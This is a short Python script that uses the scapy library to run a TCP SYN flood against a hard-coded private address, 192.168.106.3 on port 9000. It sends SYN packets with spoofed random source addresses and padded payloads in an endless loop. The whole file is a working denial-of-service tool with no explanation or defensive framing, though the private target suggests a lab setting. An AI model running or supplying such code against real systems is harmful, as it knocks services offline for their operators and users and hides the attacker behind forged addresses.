from scapy.all import *
from scapy.layers.inet import *

# scapy
def tcp_syn():
    target_ip = "192.168.106.3"
    target_port = 9000
    ip = IP(src=RandIP(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)


if __name__ == '__main__':
    tcp_syn()
